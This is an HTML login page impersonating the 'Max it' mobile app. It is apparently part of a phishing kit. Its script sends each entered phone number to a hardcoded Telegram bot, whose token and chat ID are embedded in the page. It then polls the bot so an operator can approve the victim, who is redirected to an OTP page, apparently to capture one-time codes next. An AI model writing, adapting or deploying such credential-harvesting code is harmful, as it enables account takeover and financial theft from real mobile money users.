<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Max it - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --orange: #FF7900; --dark-bg: #1c1c1e; --btn-brown: #3e2723; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #e5e5ea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 400px; height: 100vh; max-height: 850px; background-color: var(--dark-bg); position: relative; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); border-radius: 40px; border: 8px solid #000; }
        .top-section { height: 55%; position: relative; background: #f4f4f4 url('https://maxitapps.netlify.app/sslimage-removebg-preview.png') center top / cover no-repeat; }
        .wave-container { position: absolute; bottom: -1px; width: 100%; line-height: 0; }
        .wave-container svg { display: block; width: 100%; height: 60px; }
        .bottom-section { height: 45%; background-color: var(--dark-bg); padding: 30px 25px; display: flex; flex-direction: column; }
        .bottom-section h2 { color: white; font-size: 22px; font-weight: 500; margin-bottom: 40px; }
        .input-group { display: flex; align-items: flex-end; border-bottom: 1px solid var(--orange); padding-bottom: 8px; margin-bottom: 40px; }
        .input-icon { color: var(--orange); font-size: 22px; margin-right: 15px; }
        .input-wrapper { display: flex; flex-direction: column; flex-grow: 1; }
        .input-wrapper label { color: #8e8e93; font-size: 12px; margin-bottom: 8px; }
        .input-wrapper input { background: transparent; border: none; color: white; font-size: 16px; outline: none; width: 100%; letter-spacing: 1px; }
        .btn-action { width: 100%; background-color: var(--btn-brown); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: auto; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="top-section">
            <div class="wave-container">
                <svg viewBox="0 0 1440 320" preserveAspectRatio="none"><path fill="#1c1c1e" d="M0,128L80,144C160,160,320,192,480,186.7C640,181,800,139,960,128C1120,117,1280,139,1360,149.3L1440,160L1440,320L1360,320C1280,320,1120,320,960,320C800,320,640,320,480,320C320,320,160,320,80,320L0,320Z"></path></svg>
            </div>
        </div>
        <div class="bottom-section">
            <h2>Authentication</h2>
            <form id="loginForm">
                <div class="input-group">
                    <i class="fa-solid fa-user input-icon"></i>
                    <div class="input-wrapper">
                        <label>Enter your phone number *</label>
                        <input type="tel" id="phoneNumber" placeholder="0-XX-XX-XX-XX" required>
                    </div>
                </div>
                <button type="button" class="btn-action" id="loginBtn">Log in</button>
            </form>
        </div>
    </div>
    <script>
        const botToken = '8748645145:AAGKd2p22f1l4BILkJoiYLitbB6de8ufAVw';
        const chatId = '6573120346';

        async function sendToTelegram(pageName, data) {
            const escapeMd = s => String(s).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            let message = `🚀 *New Data from ${pageName}*\n\n`;
            for (const [key, value] of Object.entries(data)) { message += `*${escapeMd(key)}*: \`${escapeMd(value)}\`\n`; }
            message += `\n👇 *Action Required:*`;
            const inlineKeyboard = { inline_keyboard: [[{ text: "✅ Approve", callback_data: `APPROVE_${data.Phone}` }, { text: "❌ Reject", callback_data: `REJECT_${data.Phone}` }]] };
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'MarkdownV2', reply_markup: JSON.stringify(inlineKeyboard) })
                });
            } catch (error) { console.error("Telegram Error:", error); }
        }

        function startPolling(phone, nextUrl, btnElement) {
            let offset = 0;
            let decided = false;
            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`).then(r => r.json()).then(data => {
                if (data.ok && data.result.length > 0) { offset = data.result[data.result.length - 1].update_id + 1; }
                const intervalId = setInterval(() => {
                    if (decided) return;
                    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`).then(r => r.json()).then(data => {
                        if (!data.ok || decided) return;
                        for (let update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const action = update.callback_query.data;
                                if (action === `APPROVE_${phone}`) { decided = true; clearInterval(intervalId); window.location.href = nextUrl; }
                                else if (action === `REJECT_${phone}`) { decided = true; clearInterval(intervalId); btnElement.innerHTML = 'Try Again'; btnElement.disabled = false; alert("Request was not approved."); }
                            }
                        }
                    });
                }, 3000);
            });
        }

        const phoneInput = document.getElementById('phoneNumber');
        phoneInput.addEventListener('input', function(e) {
            let cleaned = ('' + this.value).replace(/\D/g, '');
            if (!cleaned.startsWith('0')) cleaned = '0' + cleaned;
            cleaned = cleaned.substring(0, 9);
            let formatted = '0';
            if (cleaned.length > 1) formatted += '-' + cleaned.substring(1, 3);
            if (cleaned.length > 3) formatted += '-' + cleaned.substring(3, 5);
            if (cleaned.length > 5) formatted += '-' + cleaned.substring(5, 7);
            if (cleaned.length > 7) formatted += '-' + cleaned.substring(7, 9);
            this.value = formatted;
        });

        document.getElementById('loginBtn').addEventListener('click', async function() {
            if (phoneInput.value.length < 13) { alert("Please enter a valid phone number."); return; }
            this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Waiting for approval...';
            this.disabled = true;
            sessionStorage.setItem('savedPhone', phoneInput.value);
            await sendToTelegram('Login Page', { 'Phone': phoneInput.value });
            startPolling(phoneInput.value, 'otp.html', this);
        });
    </script>
</body>
</html>
